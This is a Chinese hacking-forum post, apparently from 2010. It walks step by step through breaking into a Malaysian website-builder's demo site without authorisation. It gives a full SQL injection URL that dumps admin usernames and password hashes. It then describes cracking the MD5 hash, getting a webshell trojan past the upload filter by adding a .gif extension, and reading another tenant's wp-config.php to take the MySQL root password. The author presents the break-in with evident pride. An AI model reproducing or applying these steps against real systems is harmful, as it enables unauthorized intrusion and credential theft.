@@ -1,0 +1,105 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+马来西亚独立建站系统不完全入侵
+D8888D主贴内容-------------------------------------------------------
+ 
+
+今天日了一个建站系统,拿到webshell, mysql root账号密码，唯独system root没有拿下,所以不算完全入侵。没什么技术可言，过程如下:
+
+1。一个建站系统
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001030502b8b744185062df88.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzMzOHwxMmU3YTE2MXwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (103.93 KB)
+
+2010-1-3 05:02
+
+2。通常都会有演示，点进去看看
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001030502f677e7f56cd02b88.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzMzOXxmNDUzZGIwNnwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (56.46 KB)
+
+2010-1-3 05:02
+
+3。找到了一个注入点
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/100103050249d6851e41d4a6e8.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM0MHxiZDg2ZGM0MHwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (11.01 KB)
+
+2010-1-3 05:02
+
+4。返回SQL错误讯息
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001030502877162420021fe85.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM0MXxjOGM2MWIxM3wxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (24.21 KB)
+
+2010-1-3 05:02
+
+5。经过多番的尝试，用户名和密码终于爆出来了：
+http://my***cms.com/shopbig5/cart.php?step=add&addnums=1&gid=-1%27/**/and/**/1=2/**/union/**/select/**/1,2,3,4,5,concat%28user,%27:%27,password%29,7,8,9,10,11,12,13,14,15,16,17,18,19,20,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21/**/from/**/mpshop_admin/**
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/100103050228e6604c86821e68.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM0MnwwNjAzN2E0OHwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (51.77 KB)
+
+2010-1-3 05:02
+
+密码md5加密过，[url=http://www.cm5.com]链接标记www.cm5.com[/url] 免费解了出来
+
+6。登入后台 http://my***cms.com/shopbig5/adm/
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001030502ecd9b96c2e87e38d.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM0M3wxNGJhZDUyN3wxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (25.31 KB)
+
+2010-1-3 05:02
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001030502ad43e1aa1719d9c9.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM0NHwxZDhiMDk1YnwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (103.65 KB)
+
+2010-1-3 05:02
+
+7。找到一个上传点，但是无法上传 php 文件
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/10010305025543b43bbf153987.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM0NXw2ODI2NTFkNHwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (40.07 KB)
+
+2010-1-3 05:02
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001030503005fc05764c71e98.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM0Nnw2ZDAyMDQ3Y3wxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (61.26 KB)
+
+2010-1-3 05:03
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/10010305039c5c1dc21cfa977b.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM0N3w1ZmI0NTJkOXwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (11.6 KB)
+
+2010-1-3 05:03
+
+8。在文件后加上一个 .gif 的扩展名然后再上传试试
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001030503220d7a4aba350bf2.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM0OHw5YWYxNTRhMXwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (60.89 KB)
+
+2010-1-3 05:03
+
+9。木马上传成功，拿到了webshell
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001030503beaae32a89ff4dc2.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM0OXwwNWMyNWU3YXwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (45.99 KB)
+
+2010-1-3 05:03
+
+10。先看看这个站的代码，很不幸的，zend加密了
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/100103164375821ad5d0730196.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM1MHw4MjVkODhlN3wxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (149.13 KB)
+
+2010-1-3 16:43
+
+11。经过测试，能够用shell
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/100103050457e7936407d48b90.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM1MXw1Njk0MDhiYnwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (48.13 KB)
+
+2010-1-3 05:04
+
+12。有权限察看 /home
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001030504072dfe8e39e5ad46.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM1Mnw2MWYzMGEzOHwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (38.55 KB)
+
+2010-1-3 05:04
+
+13。走走看看，看到一个wordpress的域名空间
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001030504f6e327f1206cd414.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM1M3xjOGIxMDZlNXwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (64.99 KB)
+
+2010-1-3 05:04
+
+14。打开wp-config.php，哈哈，这里我们拿到了mysql root 和密码了
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/100103050420cf9de4924884a3.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM1NHw1OTMyYjRlYXwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (99 KB)
+
+2010-1-3 05:04
+
+15。测试这个mysql 密码是否正确的方法：
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001030504661ec12202114e82.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM1NXxmNzgyZWY3ZHwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (19.96 KB)
+
+2010-1-3 05:04
+
+16。尝试用这个mysql root密码登入入ssh,但是失败了
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1001/1001031237bdb347426661128a.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=MzM1NnxiNWIyNWJhNnwxMjg2NDgyMzQxfDNiNjNzUnlDdEdZTkFncW5JbkdMZFVFQXBHNjJ4akh0UVpwRjEwaUl6d2krTjFr&nothumb=yes]链接标记下载[/url] (14.17 KB)
+
+2010-1-3 12:37
+
+{终了。。。}
